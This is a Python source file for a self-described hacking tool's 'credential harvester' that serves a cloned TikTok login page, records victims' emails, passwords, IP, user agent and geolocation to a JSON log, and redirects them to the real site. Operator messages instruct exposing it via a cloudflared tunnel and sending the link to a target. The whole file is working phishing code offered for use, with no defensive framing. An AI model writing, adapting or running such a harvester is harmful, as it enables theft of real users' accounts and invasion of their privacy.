# ============================================================
#   BARA HACK TOOL - CREDENTIAL HARVESTER
#   Created by Bara
# ============================================================

import socket
import threading
import json
import urllib.parse
import requests
from datetime import datetime
from ui import (section, err, info, field, end_field,
                prompt, press_enter, C_GREEN, C_RED, C_YELLOW, C_WHITE)

LOG_FILE = "creds.json"


def get_tiktok_html():
    return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Log in | TikTok</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',sans-serif;}
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
.box{width:100%;max-width:380px;padding:24px;}
.logo{text-align:center;margin-bottom:32px;}
.logo h1{color:#000;font-size:32px;font-weight:900;letter-spacing:-1px;}
.logo h1 span{color:#fe2c55;}
h2{font-size:24px;font-weight:700;margin-bottom:8px;color:#161823;}
.sub{color:#86878b;font-size:14px;margin-bottom:24px;}
input{width:100%;padding:14px 12px;margin-bottom:12px;border:1px solid #e3e3e4;border-radius:4px;font-size:15px;background:#fff;}
input:focus{outline:none;border-color:#a1a2a5;}
.btn{width:100%;padding:14px;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;}
.btn:hover{background:#e6284c;}
.forgot{text-align:center;margin-top:16px;}
.forgot a{color:#161823;font-size:13px;text-decoration:none;}
.footer{text-align:center;margin-top:32px;color:#86878b;font-size:12px;}
</style>
</head>
<body>
<div class="box">
  <div class="logo"><h1>Tik<span>Tok</span></h1></div>
  <h2>Log in to TikTok</h2>
  <p class="sub">Manage your account, check notifications, comment on videos, and more.</p>
  <form method="POST" action="/login">
    <input type="text" name="email" placeholder="Email or username" required autofocus>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" class="btn">Log in</button>
  </form>
  <div class="forgot"><a href="#">Forgot password?</a></div>
  <div class="footer">© 2026 TikTok</div>
</div>
</body>
</html>"""


def get_success_html(redirect_url="https://www.tiktok.com"):
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>TikTok</title>
<style>body{{background:#000;color:#fff;text-align:center;padding:100px 20px;font-family:sans-serif;}}
.sp{{width:64px;height:64px;border:5px solid #fe2c55;border-top-color:transparent;border-radius:50%;animation:s 1s linear infinite;margin:50px auto;}}
@keyframes s{{to{{transform:rotate(360deg)}}}}</style></head>
<body><h1>Logging in...</h1><div class="sp"></div>
<script>setTimeout(()=>location.href='{redirect_url}',1500);</script>
</body></html>"""


def geolocate(ip):
    try:
        return requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as",
            timeout=5
        ).json()
    except Exception:
        return {}


def parse_http(data):
    try:
        headers_raw, _, body = data.partition("\r\n\r\n")
        lines = headers_raw.split("\r\n")
        method, path, _ = lines[0].split(" ", 2)
        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        return method, path, headers, body
    except Exception:
        return None, None, {}, ""


def handle_client(conn, addr):
    try:
        conn.settimeout(10)
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = conn.recv(4096)
            if not chunk: break
            raw += chunk
        data = raw.decode("utf-8", errors="ignore")

        method, path, headers, body = parse_http(data)
        real_ip = headers.get("x-forwarded-for", addr[0]).split(",")[0].strip()
        ua = headers.get("user-agent", "-")
        lang = headers.get("accept-language", "-")

        if method == "POST" and path == "/login":
            form = urllib.parse.parse_qs(body)
            email = form.get("email", [""])[0]
            password = form.get("password", [""])[0]
            geo = geolocate(real_ip)

            record = {
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "email": email,
                "password": password,
                "ip": real_ip,
                "country": geo.get("country"),
                "region": geo.get("regionName"),
                "city": geo.get("city"),
                "isp": geo.get("isp"),
                "org": geo.get("org"),
                "user_agent": ua,
                "language": lang,
            }

            print(f"\n{C_RED}  ╔══════════════════════════════════════════════╗")
            print(f"{C_RED}  ║  {C_YELLOW}🔥 CREDENTIALS CAPTURED 🔥{C_RED}                  ║")
            print(f"{C_RED}  ╚══════════════════════════════════════════════╝\n")
            for k, v in record.items():
                color = C_YELLOW if k in ("email", "password") else C_GREEN
                field(k, str(v), color=color)
            end_field()

            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps(record, ensure_ascii=False) + "\n")

            html = get_success_html().encode()
            resp = (f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n"
                    f"Content-Length: {len(html)}\r\nConnection: close\r\n\r\n").encode() + html
            conn.sendall(resp)

        else:
            html = get_tiktok_html().encode()
            resp = (f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n"
                    f"Content-Length: {len(html)}\r\nConnection: close\r\n\r\n").encode() + html
            conn.sendall(resp)

    except Exception as e:
        err(f"Handler: {e}")
    finally:
        try: conn.close()
        except: pass


def run_harvester():
    section("CREDENTIAL HARVESTER - TIKTOK")
    port_str = prompt("Port [ENTER = 8080]") or "8080"
    try:
        port = int(port_str)
    except ValueError:
        err("Invalid.")
        press_enter()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("0.0.0.0", port))
    except OSError as e:
        err(f"Port gagal: {e}")
        press_enter()
        return
    s.listen(50)

    print(f"\n{C_GREEN}  [OK] Server phishing aktif di 0.0.0.0:{port}")
    print(f"{C_YELLOW}  [!] Buka PowerShell BARU: cloudflared tunnel --url http://localhost:{port}")
    print(f"{C_YELLOW}  [!] Kirim URL trycloudflare ke target")
    print(f"{C_YELLOW}  [!] Target isi form -> data masuk real-time. Ctrl+C stop.\n")

    try:
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print(f"\n{C_RED}  [!] Stop.")
    finally:
        s.close()
    press_enter()
